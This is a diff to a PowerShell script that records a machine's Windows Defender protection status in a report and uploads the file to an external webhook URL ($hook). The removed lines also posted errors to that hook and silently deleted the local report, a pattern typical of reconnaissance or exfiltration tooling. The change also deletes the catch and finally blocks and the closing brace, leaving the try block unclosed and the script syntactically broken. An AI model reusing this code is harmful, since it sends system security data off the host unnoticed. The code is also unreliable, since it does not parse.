@@ -35,27 +35,20 @@ try {
     "`n=== Protection Status ===" | Out-File $reportPath -Append
     Get-MpComputerStatus | Select-Object AntivirusEnabled,AntivirusSignatureAge,RealTimeProtectionEnabled | Format-List | Out-File $reportPath -Append
 
-    # Send report via native PowerShell
-    $fileBytes = [System.IO.File]::ReadAllBytes($reportPath)
-    $boundary = [System.Guid]::NewGuid().ToString()
-    $body = @(
-        "--$boundary",
-        "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $reportPath -Leaf)`"",
-        "Content-Type: application/octet-stream",
-        "",
-        [System.Convert]::ToBase64String($fileBytes),
-        "--$boundary--"
-    ) -join "`r`n"
+    # Send report via native PowerShell (corrected)
+$fileContent = [System.IO.File]::ReadAllBytes($reportPath)
+$boundary = [System.Guid]::NewGuid().ToString()
+$LF = "`r`n"
 
-    Invoke-RestMethod -Uri $hook -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
-}
-catch {
-    $errorMsg = "ERROR: $($_.Exception.Message)`nStack Trace: $($_.ScriptStackTrace)"
-    $errorMsg | Out-File $reportPath -Append
-    Invoke-RestMethod -Uri $hook -Method Post -Body @{ content = $errorMsg } -ErrorAction SilentlyContinue
-}
-finally {
-    if (Test-Path $reportPath) {
-        Remove-Item $reportPath -Force -ErrorAction SilentlyContinue
-    }
-}
+$body = @(
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $reportPath -Leaf)`"",
+    "Content-Type: text/plain$LF",
+    [System.Text.Encoding]::UTF8.GetString($fileContent),
+    "--$boundary--"
+) -join $LF
+
+Invoke-RestMethod -Uri $hook -Method Post `
+    -ContentType "multipart/form-data; boundary=$boundary" `
+    -Body $body
+
